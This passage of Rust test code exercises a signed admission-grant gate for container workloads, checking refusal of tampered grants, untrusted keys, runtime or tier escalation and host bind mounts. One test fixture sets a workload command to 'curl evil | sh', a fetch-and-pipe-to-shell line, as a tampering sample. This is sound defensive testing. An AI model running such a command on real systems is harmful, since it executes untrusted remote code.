            name: "YAH_PRODUCED_DIR".into(),
            value: EnvValue::Literal {
                value: "/var/lib/yah/qed/produced/abc123".into(),
            },
        });
        g.covers(&spec).unwrap();
    }

    #[test]
    fn an_ungranted_nested_sandbox_request_is_not_covered() {
        let mut spec = dispatched_spec();
        spec.annotations.insert(
            crate::NESTED_SANDBOX_ANNOTATION.into(),
            crate::NESTED_SANDBOX_VALUE.into(),
        );
        assert!(matches!(
            grant().covers(&spec).unwrap_err(),
            AdmissionError::Mismatch {
                field: "nested-sandbox",
                ..
            }
        ));
    }

    #[test]
    fn requesting_less_privilege_than_granted_is_covered() {
        // Implication, not equality — a spec that drops host networking is
        // still within what the author vouched for.
        let mut spec = dispatched_spec();
        spec.annotations.remove(crate::HOST_NETWORK_ANNOTATION);
        grant().covers(&spec).unwrap();
    }

    #[test]
    fn a_bind_mount_outside_the_forge_state_root_is_not_covered() {
        // The one execution-determining field the grant cannot enumerate (the
        // produced dir is per-run), so it is bounded structurally instead.
        let mut spec = dispatched_spec();
        spec.volumes.push(VolumeMount {
            source: VolumeSource::Bind {
                host_path: PathBuf::from("/etc"),
            },
            target: PathBuf::from("/host-etc"),
            read_only: false,
        });
        assert!(matches!(
            grant().covers(&spec).unwrap_err(),
            AdmissionError::Mismatch {
                field: "volumes",
                ..
            }
        ));
    }

    #[test]
    fn a_native_exec_spec_is_not_covered_by_a_container_grant() {
        let mut spec = dispatched_spec();
        spec.annotations.insert(
            crate::NATIVE_EXEC_ANNOTATION.into(),
            crate::NATIVE_EXEC_VALUE.into(),
        );
        assert!(matches!(
            grant().covers(&spec).unwrap_err(),
            AdmissionError::Mismatch {
                field: "runtime",
                ..
            }
        ));
    }

    #[test]
    fn a_microvm_spec_is_not_covered_by_a_container_grant() {
        // R605-F8. The direction here is the counter-intuitive one and is
        // deliberate: a microVM is a *stronger* boundary than the container the
        // grant admits, and it is still refused. A grant states the runtime it
        // was cut for, and "stronger, therefore close enough" is exactly the
        // reasoning that makes a signed statement stop meaning anything — the
        // fix is to re-sign for `microvm`, not to widen the comparison.
        let mut spec = dispatched_spec();
        spec.annotations.insert(
            crate::NATIVE_EXEC_ANNOTATION.into(),
            crate::MICROVM_EXEC_VALUE.into(),
        );
        assert!(matches!(
            grant().covers(&spec).unwrap_err(),
            AdmissionError::Mismatch {
                field: "runtime",
                ..
            }
        ));
    }

    #[test]
    fn a_microvm_grant_round_trips_through_the_signing_encoding() {
        // The parse arm is the one that can silently rot: `as_str` writes
        // "microvm" and `parse` has to know it, or every microVM grant becomes
        // an unverifiable BadValue the moment it is read back.
        let mut spec = dispatched_spec();
        spec.annotations.insert(
            crate::NATIVE_EXEC_ANNOTATION.into(),
            crate::MICROVM_EXEC_VALUE.into(),
        );
        let cut = AdmissionGrant::from_spec("forge", &spec);
        assert_eq!(cut.runtime, GrantRuntime::MicroVm);

        let back = AdmissionGrant::parse(&cut.encode()).expect("parse round-trip");
        assert_eq!(back.runtime, GrantRuntime::MicroVm);
        back.covers(&spec).expect("a microvm grant covers its own spec");
    }

    #[test]
    fn a_tier_escalation_is_not_covered() {
        let mut spec = dispatched_spec();
        spec.tier = TierTag("tenant".into());
        assert!(matches!(
            grant().covers(&spec).unwrap_err(),
            AdmissionError::Mismatch { field: "tier", .. }
        ));
        // And the mesh identity is untouched by any of this — the grant says
        // nothing about which forge run this is, on purpose.
        assert_eq!(spec.expose.mesh.identity, MeshIdent("forge.abc123".into()));
    }

    #[test]
    fn policy_parse_rejects_a_typo_rather_than_falling_back() {
        assert_eq!(Policy::parse("required").unwrap(), Policy::Required);
        assert_eq!(Policy::parse(" permissive ").unwrap(), Policy::Permissive);
        assert_eq!(Policy::parse("disabled").unwrap(), Policy::Disabled);
        assert!(Policy::parse("Required").is_err());
        assert!(Policy::parse("on").is_err());
        assert_eq!(Policy::default(), Policy::Permissive);
    }

    #[test]
    fn image_ref_string_is_stable_and_pins_the_digest() {
        assert_eq!(image_ref_string(&image()), format!("{IMAGE}:v149.4.0@{DIGEST}"));
    }
}

#[cfg(all(test, feature = "admission-verify"))]
mod verify_tests {
    use super::tests::{dispatched_spec, grant};
    use super::*;

    fn key() -> ed25519_dalek::SigningKey {
        ed25519_dalek::SigningKey::from_bytes(&[7u8; 32])
    }

    fn public_hex(k: &ed25519_dalek::SigningKey) -> String {
        hex::encode(k.verifying_key().to_bytes())
    }

    /// A dispatched spec carrying a genuine grant signed by `key()`.
    fn signed_dispatch() -> (WorkloadSpec, Vec<String>) {
        let k = key();
        let g = grant();
        let encoded = g.encode();
        let sig = sign_grant(&encoded, &k);
        let pk = public_hex(&k);
        let mut spec = dispatched_spec();
        attach(&mut spec, &encoded, &sig, &pk);
        (spec, vec![pk])
    }

    #[test]
    fn a_signed_dispatch_is_admitted() {
        let (spec, trusted) = signed_dispatch();
        admit(&spec, Policy::Permissive, &trusted).unwrap();
        admit(&spec, Policy::Required, &trusted).unwrap();
    }

    #[test]
    fn an_unsigned_workload_passes_permissive_and_fails_required() {
        let spec = dispatched_spec();
        admit(&spec, Policy::Permissive, &[]).unwrap();
        assert!(matches!(
            admit(&spec, Policy::Required, &[]).unwrap_err(),
            AdmissionError::GrantRequired { .. }
        ));
    }

    #[test]
    fn the_nested_sandbox_widening_always_needs_a_grant() {
        // W235 §Reshaping's ordering constraint ("B2's widening is defensible
        // only once F4's admission gate exists"), enforced by code rather than
        // by sequencing discipline: permissive is not permissive about THIS.
        let mut spec = dispatched_spec();
        spec.annotations.insert(
            crate::NESTED_SANDBOX_ANNOTATION.into(),
            crate::NESTED_SANDBOX_VALUE.into(),
        );
        assert!(matches!(
            admit(&spec, Policy::Permissive, &[]).unwrap_err(),
            AdmissionError::GrantRequired { .. }
        ));
        // ...and `disabled` is the one escape hatch that turns it off.
        admit(&spec, Policy::Disabled, &[]).unwrap();
    }

    #[test]
    fn a_native_spec_carrying_the_widening_is_kamajis_shape_refusal_not_ours() {
        // Both markers set is an INCOHERENT spec — the widening is an OCI
        // capability set and a fork+exec workload has no OCI spec — so kamaji
        // refuses the pair with a message that explains that (R577-T1). If
        // admission claimed it first, the operator would get "not admitted" for
        // a spec whose actual problem is that it asks for something that cannot
        // exist. There is no privilege to protect, so we step aside.
        let mut spec = dispatched_spec();
        spec.annotations.insert(
            crate::NESTED_SANDBOX_ANNOTATION.into(),
            crate::NESTED_SANDBOX_VALUE.into(),
        );
        spec.annotations.insert(
            crate::NATIVE_EXEC_ANNOTATION.into(),
            crate::NATIVE_EXEC_VALUE.into(),
        );
        admit(&spec, Policy::Permissive, &[]).unwrap();
        // `required` still requires — the exception narrows the unconditional
        // rule, it does not punch a hole in the policy.
        assert!(matches!(
            admit(&spec, Policy::Required, &[]).unwrap_err(),
            AdmissionError::GrantRequired { .. }
        ));
    }

    #[test]
    fn an_untrusted_key_is_refused_before_any_crypto_runs() {
        let (spec, _) = signed_dispatch();
        assert!(matches!(
            admit(&spec, Policy::Permissive, &["ff".repeat(32)]).unwrap_err(),
            AdmissionError::UntrustedKey { .. }
        ));
    }

    #[test]
    fn required_with_no_pinned_keys_refuses_everything() {
        // Pinning nothing means trusting nothing. An operator who flips a node
        // to `required` without configuring keys gets a loud outage, not a
        // quiet no-op gate.
        let (spec, _) = signed_dispatch();
        assert!(matches!(
            admit(&spec, Policy::Required, &[]).unwrap_err(),
            AdmissionError::UntrustedKey { .. }
        ));
    }

    #[test]
    fn a_signature_from_a_different_key_does_not_verify() {
        let other = ed25519_dalek::SigningKey::from_bytes(&[9u8; 32]);
        let g = grant();
        let encoded = g.encode();
        let mut spec = dispatched_spec();
        // Claim the trusted key while signing with another one.
        attach(
            &mut spec,
            &encoded,
            &sign_grant(&encoded, &other),
            &public_hex(&key()),
        );
        assert!(matches!(
            admit(&spec, Policy::Permissive, &[public_hex(&key())]).unwrap_err(),
            AdmissionError::SignatureMismatch
        ));
    }

    #[test]
    fn widening_the_grant_after_signing_does_not_verify() {
        // The R710-S1 failure mode, checked directly: take a legitimately
        // signed grant and flip the privilege bit it vouches for.
        let (mut spec, trusted) = signed_dispatch();
        let tampered = spec
            .annotations
            .get(GRANT_ANNOTATION)
            .unwrap()
            .replace("nested-sandbox 5\nfalse\n", "nested-sandbox 4\ntrue\n");
        spec.annotations
            .insert(GRANT_ANNOTATION.into(), tampered.clone());
        assert!(tampered.contains("nested-sandbox 4\ntrue"));
        assert!(matches!(
            admit(&spec, Policy::Permissive, &trusted).unwrap_err(),
            AdmissionError::SignatureMismatch
        ));
    }

    #[test]
    fn tampering_with_the_spec_under_a_valid_signature_is_caught_by_coverage() {
        // The signature still verifies — nothing about the grant changed — so
        // this is the check that `covers` exists for.
        let (mut spec, trusted) = signed_dispatch();
        spec.command = Some(vec!["curl evil | sh".into()]);
        assert!(matches!(
            admit(&spec, Policy::Permissive, &trusted).unwrap_err(),
            AdmissionError::Mismatch { field: "argv", .. }
        ));
    }

    #[test]
    fn a_partial_annotation_set_is_an_error_not_an_absence() {
        // Stripping the signature must not read as "unsigned, let it through".
        let (mut spec, trusted) = signed_dispatch();
        spec.annotations.remove(GRANT_SIGNATURE_ANNOTATION);
        assert!(matches!(
            admit(&spec, Policy::Permissive, &trusted).unwrap_err(),
            AdmissionError::Incomplete {
                missing: GRANT_SIGNATURE_ANNOTATION
            }
        ));
    }

    #[test]
    fn disabled_admits_a_workload_with_a_broken_grant() {
        let (mut spec, _) = signed_dispatch();
        spec.annotations
            .insert(GRANT_SIGNATURE_ANNOTATION.into(), "not-hex".into());
        admit(&spec, Policy::Disabled, &[]).unwrap();
    }
}

#[cfg(all(test, feature = "admission-verify"))]
mod node_posture_tests {
    use super::*;

    #[test]
    fn unset_is_permissive_with_no_keys() {
        let n = NodeAdmission::from_vars(None, None);
        assert_eq!(n.policy, Policy::Permissive);
        assert!(n.trusted_keys.is_empty());
    }

    #[test]
    fn a_typo_fails_closed_to_required() {
        // The whole point: setting the variable and having it silently ignored
        // is the failure mode an operator cannot detect.
        assert_eq!(
            NodeAdmission::from_vars(Some("Required"), None).policy,
            Policy::Required
        );
        assert_eq!(
            NodeAdmission::from_vars(Some("yes"), None).policy,
            Policy::Required
        );
    }

    #[test]
    fn keys_are_split_trimmed_and_emptied() {
        let n = NodeAdmission::from_vars(Some("required"), Some(" aa , bb ,, "));
        assert_eq!(n.policy, Policy::Required);
        assert_eq!(n.trusted_keys, vec!["aa".to_string(), "bb".to_string()]);
    }
}
